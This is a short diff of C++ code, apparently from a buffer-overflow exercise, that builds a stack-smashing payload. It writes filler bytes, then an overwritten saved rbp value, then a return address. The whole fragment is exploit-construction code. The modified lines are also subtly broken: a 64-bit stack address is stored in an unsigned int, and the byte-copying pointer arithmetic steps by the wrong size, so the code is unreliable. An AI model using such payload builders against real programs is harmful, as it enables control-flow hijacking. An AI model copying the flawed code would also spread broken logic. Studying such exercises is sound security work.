@@ -28,14 +28,14 @@ string * getSolution(unsigned int addr){
 	getline(cin, input);
 	int filler = stoi(input, NULL, 10);
 	input = "";
-	char rbp[] = {'\176', '\232', '\255', '\255', '\255', '\127', '\000', '\000'};
-	cout << "Filler length = " << dec << filler << "\nAddr = " << hex << addr << endl;
+	unsigned int rbp = 0x7fffffffe818;
+	cout << "Filler length = " << dec << filler << "\nrbp = " << hex << rbp << "\nAddr = " << hex << addr << endl;
 	char char_arr[filler+12];
 	for(int i=0; i<filler; i++){
 		char_arr[i] = 's';
 	}
 	for(int i=filler; i<filler+8; i++){
-		char_arr[i] = rbp[i-filler];
+		char_arr[i] = *((char *) (&rbp + sizeof(char) * (i-filler)));
 	}
 	for(int i=filler+8; i<filler+12; i++){
 		char_arr[i] = *((char *) (&addr + sizeof(char) * (i-filler-8)));
